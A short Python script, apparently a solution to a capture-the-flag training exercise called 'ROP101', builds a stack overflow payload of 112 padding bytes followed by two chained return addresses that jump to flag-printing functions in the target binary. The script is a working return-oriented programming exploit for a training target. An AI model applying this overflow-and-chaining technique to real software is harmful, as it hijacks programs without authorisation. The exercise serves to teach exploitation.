"""Get flag 2 of ROP101 - Chaining 2 returns
Author: Eugene Kolodenker <eugene@eugenekolo.com>
"""
import struct
import telnetlib

def p(x):
    return struct.pack('<L', x)

get_flag2 = 0x804892b
setup_get_flag2 = 0x8048921

# Flag 2
payload = ""
payload += "P"*112  # Add the padding leading to the overflow
payload += p(setup_get_flag2)
payload += p(get_flag2)
print(payload)
